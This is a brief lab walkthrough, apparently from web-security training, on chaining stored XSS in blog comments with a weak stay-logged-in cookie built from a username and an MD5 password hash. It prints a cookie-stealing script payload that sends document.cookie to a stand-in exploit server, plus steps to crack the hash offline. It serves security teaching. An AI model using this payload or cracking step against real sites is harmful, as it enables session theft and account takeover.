## LAB: Offline Password Cracking

**Vulnerability:** Broken Authentication - stay-logged-in cookie leaked via XSS, cracked offline

**Steps:**
- Decode your own stay-logged-in cookie to confirm structure
(`base64` → `username:md5(password)`)
- Test for XSS on blog comments using `<script>alert(1)</script>`
- If XSS confirmed, inject cookie-stealing payload:
`<script>document.location='https://your-exploit-server.net/exploit?c='+document.cookie</script>`
- Retrieve victim's cookie from exploit server access log
- Decode and crack the MD5 hash to recover their password

**Bug Bounty Testing:** XSS and weak cookie construction can chain
together, always check if you can exfiltrate cookies and whether
those cookies contain crackable credential data
